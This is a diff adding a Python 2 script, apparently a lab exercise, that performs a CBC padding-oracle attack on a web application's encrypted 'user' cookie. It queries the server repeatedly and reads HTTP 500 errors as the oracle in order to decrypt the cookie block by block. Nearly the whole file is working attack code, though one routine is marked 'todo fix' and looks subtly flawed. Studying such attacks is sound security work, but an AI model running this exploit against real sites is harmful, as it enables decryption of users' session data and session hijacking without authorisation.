@@ -1,0 +1,142 @@
+#!/usr/bin/python
+
+import urllib2 as url
+import base64
+import sys
+import random
+import string
+import httplib
+#from ctypes import c_uint8
+from util import *
+
+
+b = 16
+one = 1
+
+def main():
+	if len(sys.argv) == 2:
+		cookie = sys.argv[1]
+	else:
+		cookie = get_cookie()
+
+	cookie_dat = decode(cookie)
+
+	#Split into blocks
+	encrypted_blocks = list(blocks(cookie_dat[16:]))
+	decrypted_blocks = []
+
+	cipher_txt_block_len = len(cookie_dat) / 16 - 1
+
+	#Decrypt blocks
+	for block in encrypted_blocks:
+		decr = block_decryption_oracle(block)
+		decrypted_blocks.append(decr)
+
+	#CBC decrypt
+	iv = cookie_dat[:16]
+	encrypted_blocks = [iv] + encrypted_blocks
+	plain_texts = []
+	for i in xrange(0,cipher_txt_block_len):
+		plain = get_plain_text(decrypted_blocks[i], encrypted_blocks[i])
+		plain_texts.append(str(plain))
+
+	#Output
+	output = "".join(plain_texts)
+	output = filter(lambda x: x in string.printable, output)
+	print output
+
+def get_plain_text(decrypted_ci, ci_m1):
+	return xor(decrypted_ci, ci_m1)
+
+def block_decryption_oracle(y):
+	last_words = last_word_oracle(y)
+	initial_j = b - len(last_words) + 1
+
+	a = concat_bytes(bytearray(initial_j - 1), last_words)
+
+	for j in xrange(initial_j, 0, -1):
+		#print str(list(a))
+		next_byte = word_decryption_oracle(a, y, j)
+		a[j - 1 - 1] = next_byte
+	
+	return a
+
+def word_decryption_oracle(a, y, j):
+	#print "j: " + str(j)
+	#2.
+	r = bytearray(random_word() for k in xrange(b))
+	##print "r: " + str(list(r))
+
+	#1.
+	p = 1
+	for k in xrange(j, b + 1):
+		r[k - 1] = a[k - 1] ^ (p + 1)#(b - j + 2)
+		p += 1
+	#print "r': " + str(list(r))
+	i = 0
+
+	#3.
+	rj11 = r[j - 1 - 1]
+	while oracle(concat_bytes(r,y)) == 0:
+		i += 1
+		r[j - 1 - 1] = rj11 ^ i 
+
+	#print "Found i: " + str(i)
+
+	return rj11 ^ i ^ 1#(b - j + 2)
+
+#Compute the last word of C^-1(y) for block y
+def last_word_oracle(y):
+	i = 0
+	r = bytearray(random_word() for k in xrange(b))
+	rb = r[-1]
+
+	while not oracle(concat_bytes(r,y)):
+		##print i
+		i += 1
+		r[-1] = rb ^ i 
+
+	rb = r[-1]
+
+	for n in xrange(b, 1, -1):#reversed(xrange(2, b + 1)): # b .. 2 inclusive
+		new_r = bytearray(r)
+		##print "r: " + str(list(new_r))
+		index = b - n + 1
+		if index >= 1:
+			new_r[index - 1] ^= one 
+
+		if oracle(concat_bytes(r,y)) == 0:
+			#print "This!!!"
+			return bytearray(new_r[j] ^ (p+1) for p,j in enumerate(xrange(index - 1, b))) #todo fix
+	
+	return bytearray(x ^ one for x in r[-1:])
+
+def oracle(cookie):
+	f = None
+	try:
+		opener = url.build_opener()
+		opener.addheaders.append(("Cookie", "user=%s" % encode(cookie)))
+		f = opener.open(webapp_url)
+	except url.HTTPError as e:
+		if e.code == 500:
+			return 0
+	except httplib.BadStatusLine as e:
+		return 1
+
+	##print f
+	return 1
+
+
+if __name__ == "__main__":
+	main()
+
+
+
+
+
+
+
+
+
+
+
